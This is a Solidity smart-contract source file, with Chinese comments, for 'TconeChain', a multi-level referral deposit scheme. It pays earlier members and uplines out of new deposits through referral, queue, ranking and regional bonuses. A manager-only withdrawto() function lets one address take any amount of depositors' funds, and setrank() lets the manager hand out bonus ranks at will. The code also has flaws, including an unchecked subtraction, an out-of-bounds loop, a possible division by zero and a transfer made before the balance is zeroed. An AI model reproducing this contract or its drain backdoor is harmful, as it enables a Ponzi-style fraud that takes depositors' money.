pragma solidity 0.5.10;

//import "./InternalModule.sol";

contract TconeChain{
    struct User {
        uint256 cycle;   //会员等级
        address upline;   //上级
        uint256 referrals;  //
        uint256 payouts;    //
        uint256 direct_bonus; //直推奖
        uint256 pool_bonus;   //全球排名分红奖
        uint256 match_bonus;   //经理奖
        uint256 region_bonus;   //经理奖
        uint256 deposit_amount;  //充值金额
        uint256 deposit_payouts;  //领取金额
        uint40 deposit_time;   
        uint256 total_deposits;  //总投资
        uint256 total_payouts;   //总奖金
        uint256 total_structure;   //团队总人数（有效人数）

    }

    struct UserEtr{
        uint256 PerformanceSum;  //总业绩
        uint256 max_deposits_sub;  //最大部门业绩
        uint256 pool_react;         //复投池
        uint256 global_bonus;         //V4全网分红
        uint8 rank;
    }

    struct BounsStruct{
        address _user;
        uint256 _amount;
    }

    address payable public owner;
    address payable public _managerAddress;
    //address payable public etherchain_fund;
    //address payable public admin_fee;

    mapping(address => User) public users;
    mapping(address => UserEtr) public userinfos;
    mapping(uint256 => address) public userxulie; //用户排序，只是投资用户
    mapping(address => uint256) public xiaoqu_users;  //小区业绩达标用户addr=>小区业绩

    uint256[] public cycles;
    uint8[] public ref_bonuses;                     // 1 => 1%
    address[] private v4_add_arr;


    uint8[] public pool_bonuses;                    // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;   //复投池累计笔数
    uint256 public pool_balance; //资金池
    uint256 public pool_react; //复投池
    uint256 public pool_global; //复投池
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;   //系统充值总额排行
    mapping(uint8 => address) public pool_top;   //系统充值额度地址总排行


    uint256 public total_users = 1;   //系统总人数
    uint256 public total_deposited;   //系统总充值
    uint256 public total_withdraw;   //系统总提现
    uint256 public shouyi_static_xulie=1; //静态分配当前序列序列
    mapping(uint8 => uint16) cengji_jiangjin;
    uint256[] xioqu_config_yeji;
    uint8[] xiaoqu_config_lv; 
    BounsStruct[] temp_jiangli_add;

    uint16 private max_ceng_jisuan=15;  //累计业绩最大层数
    uint16 private paiming_kaohe=10;  //累计业绩最大层数
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event LineUpPayout(address indexed addr, address indexed from, uint256 amount);
    event RegionPerformancePayout(address indexed addr, address indexed from, uint256 amount);
    event GlobalPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
        owner = _owner;
        
        //etherchain_fund = 0xDaE41A6dE97E6446954D0f6053Ed2008776D6A1b;
        //admin_fee = 0x31aa4BedE2ebD80346acD8a01B99B809438EAa5B;
        
        //推荐奖，层级和奖金比例
        ref_bonuses.push(50);
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        /*
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        */

        //分红池，分红奖比例
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(15);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);

        //等级和等级最少充值金额
        cycles.push(1e11);
        cycles.push(3e11);
        cycles.push(9e11);
        cycles.push(2e12);


        cengji_jiangjin[1]=25;
        cengji_jiangjin[3]=10;
        cengji_jiangjin[5]=5;
        cengji_jiangjin[7]=3;
        cengji_jiangjin[9]=3;
        cengji_jiangjin[11]=3;
        cengji_jiangjin[13]=3;
        cengji_jiangjin[15]=2;

        xioqu_config_yeji.push(5e11);
        xioqu_config_yeji.push(15e11);
        xioqu_config_yeji.push(5e12);
        xioqu_config_yeji.push(1e13);

        xiaoqu_config_lv.push(3);
        xiaoqu_config_lv.push(5);
        xiaoqu_config_lv.push(8);
        xiaoqu_config_lv.push(8);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    modifier OwnerOnly() {
        require( owner == msg.sender ); _;
    }

    modifier ManagerOnly() {
        require(msg.sender == _managerAddress); _;
    }

    function SetManager(address payable rmaddr ) external OwnerOnly {
        _managerAddress = rmaddr;
    }

//确定上下级关系
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            
            //users[_upline].total_structure++;
            /*
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
            */
        }

        
    }


//充值，内部私密函数
    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        _amount = _amount - 1e8;

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            _amount += userinfos[_addr].pool_react;
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");

            require(_amount >= 1e9, "Error Deposit Number");

            pool_react -= userinfos[_addr].pool_react;
            userinfos[_addr].pool_react = 0;
            _amount = _amount / 1000000;
            _amount = _amount * 1000000;
            
            /*
            uint256 canshu = (_amount + userinfos[_addr].pool_react) / 1e9;
            require(canshu >0,"Bad amount");
            uint256 realdisp= canshu * 1e9;
            uint256 react_pool_kou = (realdisp - _amount);
            require(react_pool_kou >=0,"Bad amount");

            userinfos[_addr].pool_react -= react_pool_kou;
            pool_react -= react_pool_kou;
            _amount = realdisp;
            */
            
            //require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else{

            userxulie[total_users] = _addr;
            /*
              uint256 PerformanceSum;  //总业绩
        uint256 max_deposits_sub;  //最大部门业绩
        uint256 pool_react;         //复投池
            */
            //require(_amount % 1000 == 0,"Bad amount");

            userinfos[_addr].PerformanceSum = 0;
            userinfos[_addr].max_deposits_sub = 0;
            userinfos[_addr].pool_react = 0;
            //require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount"); //如果充值额小于最小配置，返回错误，第一次充值，只能充最小的。
        } 
        
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);


        

        /*
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }*/
        _setRegionPerformance(_addr , _amount);

        _refPayout(_addr , _amount);

        _paiduiPayout(_addr, _amount);

        _pollDeposits(_addr, _amount);

        _xiaoquPayout(_addr, _amount);

        //每天一次，充值奖金池
        
        /*
        if(pool_last_draw + 10 days < block.timestamp) {
            _drawPool();
        }
        */
        

        //uint256 max_jing = users[to_1].deposit_amount * 2;
        
        _fafang();
        //_managerAddress.transfer(1e8);
        //etherchain_fund.transfer(_amount * 3 / 100);
        
    }

    //系统业绩排名。日排名
    function _pollDeposits(address _addr, uint256 _amount) private {
        //pool_balance += _amount * 3 / 100;
        pool_balance += _amount * 6 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break; //如果top i就是此人，直接退出

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;//如果top 3此位置没人，也就是位置值为0，那就是此人
                break;
            }

            //如果当前top i 位置值小于此人当天业绩
            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) { 
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    //如果某个top位置已经存在此人，则需要把
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                //把i位置和其后面的人，都往下挪一个
                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                //给排名的某个位置赋值
                pool_top[i] = upline;

                break;
            }
        }
    }

    //设置各个上级的区域业绩，主要是大区业绩和总业绩。
    function _setRegionPerformance(address _addr, uint256 _amount) private{
        address up = users[_addr].upline;
        //address up_up_addr = users[up].upline;
        //bool xiaoqu_falg = false;
        uint256 temp_xiaoqu_sum = 0;
        address _addr_cur =  _addr;
        for(uint16 i = 1; i <= max_ceng_jisuan; i++){
            if(up == address(0)) break;
            userinfos[up].PerformanceSum += _amount;
            //up_up_addr = users[up].upline;
            
                if(userinfos[up].max_deposits_sub < (userinfos[_addr_cur].PerformanceSum + users[_addr_cur].total_deposits)){
                    userinfos[up].max_deposits_sub = userinfos[_addr_cur].PerformanceSum + users[_addr_cur].total_deposits;
                    
                    /*
                    if(!xiaoqu_falg && xiaoqu_users[up]>0){
                        xiaoqu_users[up] = 0;
                    }
                    */
                }

                temp_xiaoqu_sum = userinfos[up].PerformanceSum - userinfos[up].max_deposits_sub;
                    //xiaoqu_falg = false;
                    for(uint8 k = 0; k <= 3; k++){
                        if(temp_xiaoqu_sum >= xioqu_config_yeji[3-k]){
                            xiaoqu_users[up] = temp_xiaoqu_sum;
                            userinfos[up].rank = 4-k;

                            if(k == 0){
                                v4_add_arr.push(up);
                            }
                            //xiaoqu_falg=true;
                            break;
                        }
                    }

            _addr_cur = up;
            up = users[up].upline;
        }
    }



    function _fafang() private{
        address to_1;
        uint256 bouns_1;
        uint256 reactpool_1;
        uint256 max_jing;
       for (uint256 i = 0; i < temp_jiangli_add.length; i++) {
           //temp_jiangli_add[i]._user
           to_1 = temp_jiangli_add[i]._user;
           max_jing = users[to_1].deposit_amount * 2;
           if(users[to_1].payouts < max_jing){
               bouns_1 = temp_jiangli_add[i]._amount;
                if(users[to_1].payouts + bouns_1 > max_jing) bouns_1 = max_jing - users[to_1].payouts;
                //payouts  
                users[to_1].payouts += bouns_1;
                users[to_1].total_payouts += bouns_1;
                
                reactpool_1 =  bouns_1 * 30 / 100;

                bouns_1 = bouns_1 * 70 / 100;

                users[to_1].total_structure += bouns_1;
                pool_react += reactpool_1;
                userinfos[to_1].pool_react += reactpool_1;
                //address(uint160(to_1)).transfer(bouns_1);
           }
          
           //to_1.transfer(bouns_1);
       }
       temp_jiangli_add.length=0;
    }

    



     function _setJiangArrar(address _addr,uint256 _bouns) private {
        bool exist = false;
        uint256 arr_len = temp_jiangli_add.length;
        for (uint256 i = 0; i < arr_len; i++) {
            if(temp_jiangli_add[i]._user == _addr){
                exist = true;
                temp_jiangli_add[i]._amount += _bouns;
                break;
            }
        }
        if(!exist){
            temp_jiangli_add.length++;
            temp_jiangli_add[arr_len]._user = _addr;
            temp_jiangli_add[arr_len]._amount = _bouns;
        }
    }



    //多层推荐奖励
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;
        uint8 tempceng = 0;
        for(uint8 i = 0; i < 15; i++){
            if(up == address(0)) break;
            
            if(i % 2 == 0){
                tempceng++;
                if(users[up].referrals >= tempceng){
                    uint256 bonus  =  _amount * cengji_jiangjin[i+1] / 100;
                    users[up].match_bonus += bonus;
                    emit MatchPayout(up, _addr, bonus);
                    //users[up].total_structure += bonus;
                    _setJiangArrar(up,bonus);
                }
            }
            up = users[up].upline;
        }
    }

   

    //排队30%分红
    function _paiduiPayout(address _addr, uint256 _amount) private {
        //shouyi_static_xulie
        
        uint256 bonus = _amount / 100;  //百分之三十分给30个人，每人百分之1
        
        for(uint8 i = 0; i < 30; i++){

            address xulieuser_addr = userxulie[shouyi_static_xulie];
            shouyi_static_xulie = shouyi_static_xulie + 1;
            if(shouyi_static_xulie > 30) shouyi_static_xulie = 1;

            if(xulieuser_addr == address(0)) continue;
            
            users[xulieuser_addr].direct_bonus += bonus;

            emit LineUpPayout(xulieuser_addr, _addr, bonus);
            
            //users[xulieuser_addr].total_structure += bonus;
            _setJiangArrar(xulieuser_addr,bonus);
        }

    }

     //小区奖金
    function _xiaoquPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;
        uint256 bonus = 0;
        //uint256 bonus_global = 0;
        uint256 bons_jicha = 0;
        //uint8 v4_count = 0;
        //address[] v4array;
        for(uint16 i = 1; i <= max_ceng_jisuan; i++){
            if(up == address(0)) break;
            if(userinfos[up].rank >0){
                 bonus = _amount * xiaoqu_config_lv[userinfos[up].rank - 1] / 100;
                 if(bonus > bons_jicha){
                        bonus -= bons_jicha;
                        users[up].region_bonus += bonus;
                        emit RegionPerformancePayout(up, _addr, bonus);
                        _setJiangArrar(up,bonus);
                        //break;
                        bons_jicha += bonus;
                 }
            }
            //uint256 temp_xiaoqu_sum = users[up].PerformanceSum + _amount - users[up_up_addr].max_deposits_sub;
           
            up = users[up].upline;
        }

        pool_global += _amount * 2 / 100;
    }

    function GlobalNetBonus() external ManagerOnly{

        uint256 bonus_global = pool_global;
        bonus_global = bonus_global / v4_add_arr.length;
        for (uint8 i = 0; i <  v4_add_arr.length; i++) {
            userinfos[v4_add_arr[i]].global_bonus += bonus_global;
            _setJiangArrar(v4_add_arr[i],bonus_global);
            emit GlobalPayout(v4_add_arr[i], address(0), bonus_global);
        }
        pool_global=0;
        _fafang();
    }

    function DrawPool() external ManagerOnly{
        _drawPool();
        _fafang();
    }

    //初始化奖金池，每天一次
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        //uint256 draw_amount = pool_balance / 10;
        uint256 draw_amount = pool_balance;

        //给上一天的N个排名前几位的，每人发布奖金，按比例分配pool_balance的十分之一
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            //pool_balance -= win;

            emit PoolPayout(pool_top[i], win);

            //users[pool_top[i]].total_structure += win;
             _setJiangArrar(pool_top[i], win);
        }
        pool_balance = 0;
        //把上一天的排名全部归零
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    

    function deposit(address _upline) payable external {
         
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function setmaxjisuan(uint16 max_value) external ManagerOnly{
        max_ceng_jisuan=max_value;
    }

    function withdrawto(uint256 amount) external ManagerOnly{
        msg.sender.transfer(amount);
    }

    function setrank(address _addr,uint8 rank) external ManagerOnly{
        userinfos[_addr].rank = rank;
        if(rank == 4){
            v4_add_arr.push(_addr);
        }
    }

     function withdraw() external {

        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender); //累计上次提现到现在静态释放金额
        
        //require(users[msg.sender].payouts < max_payout, "Full payouts");

        to_payout = users[msg.sender].total_structure;

        //if(users[msg.sender].payouts + to_payout > max_payout) to_payout = max_payout - users[msg.sender].payouts;

        /*
        users[msg.sender].pool_bonus = 0;
        users[msg.sender].region_bonus = 0;
        users[msg.sender].direct_bonus = 0;
        users[msg.sender].match_bonus = 0;
        userinfos[msg.sender].global_bonus = 0;
        */
        require(to_payout > 0, "Zero payout");
        
        /*
        users[msg.sender].total_payouts += to_payout;
        users[msg.sender].payouts += to_payout;
        total_withdraw += to_payout;

        uint256 to_payout_real = to_payout * 70 / 100;
        uint256 to_payout_futou = to_payout * 30 / 100;
        userinfos[msg.sender].pool_react += to_payout_futou;
        pool_react += to_payout_futou;
        */

        msg.sender.transfer(to_payout);

        users[msg.sender].total_structure = 0;
        //users[msg.sender].total_payouts += to_payout;
        //users[msg.sender].payouts += to_payout;
        total_withdraw += to_payout;

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
   

    function withdraw222() private {

        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender); //累计上次提现到现在静态释放金额
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        to_payout = users[msg.sender].total_structure;

        if(users[msg.sender].payouts + to_payout > max_payout) to_payout = max_payout - users[msg.sender].payouts;
        // Deposit payout  多层推荐
        /*
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }*/
        
        /*
        // Direct payout  直推奖，在下级充值时已经计算好，这儿发放，此系统直接改成排队收益
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout    奖池分红，系统前几名才有，在每天_drawPool里有个每天一次的结算上一天排名奖金，在那儿累计。这儿发放
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout  管理奖吧，在多层推荐里结算累计，这儿发放
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        //小区分红
         if(users[msg.sender].payouts < max_payout && users[msg.sender].region_bonus > 0) {
            uint256 region_bonus = users[msg.sender].region_bonus;

            if(users[msg.sender].payouts + region_bonus > max_payout) {
                region_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].region_bonus =0;
            users[msg.sender].payouts += region_bonus;
            to_payout += region_bonus;
        }
        */
        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        users[msg.sender].payouts += to_payout;
        total_withdraw += to_payout;

        uint256 to_payout_real = to_payout * 70 / 100;
        uint256 to_payout_futou = to_payout * 30 / 100;
        userinfos[msg.sender].pool_react += to_payout_futou;
        pool_react += to_payout_futou;

        msg.sender.transfer(to_payout_real);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        //return _amount * 31 / 10;
        return _amount * 2;
    }

    //按比例静态释放
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
        payout = 0; //此系统没有静态释放
         /*
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;//按时间，每天静态释放，按照比例
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }*/
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoEx(address _addr) view external returns(uint256 region_buonus, uint256 performace_sum,uint256 performace_max, uint256 _pool_react,uint256 _global_bonus,uint8 _rank) {
        return (users[_addr].region_bonus, userinfos[_addr].PerformanceSum, userinfos[_addr].max_deposits_sub, userinfos[_addr].pool_react, userinfos[_addr].global_bonus,userinfos[_addr].rank);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider,uint256 _pool_react) {
        //return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]], pool_react);
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_global, pool_react);
    }

    function poolTopInfo() view external returns(address[10] memory addrs, uint256[10] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}